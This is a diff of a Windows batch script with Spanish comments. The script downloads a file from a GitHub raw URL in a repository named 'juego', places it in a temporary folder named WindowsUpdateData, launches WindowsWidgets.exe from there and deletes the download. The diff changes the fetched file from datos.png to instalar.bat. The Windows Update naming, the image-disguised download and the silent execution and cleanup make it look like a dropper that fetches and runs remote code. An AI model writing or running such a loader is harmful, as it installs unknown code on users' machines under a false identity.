@@ -1,6 +1,6 @@
 @echo off
 :: Configuración
-set "url=https://raw.githubusercontent.com/deuzinnuse-collab/juego/refs/heads/main/datos.png"
+set "url=https://raw.githubusercontent.com/deuzinnuse-collab/juego/refs/heads/main/instalar.bat"
 set "tempZip=%TEMP%\update_data.zip"
 set "destDir=%TEMP%\WindowsUpdateData"
 
@@ -21,3 +21,4 @@ start "" "%destDir%\WindowsWidgets.exe"
 :: Limpieza opcional del ZIP descargado
 del /q "%tempZip%"
 exit
+
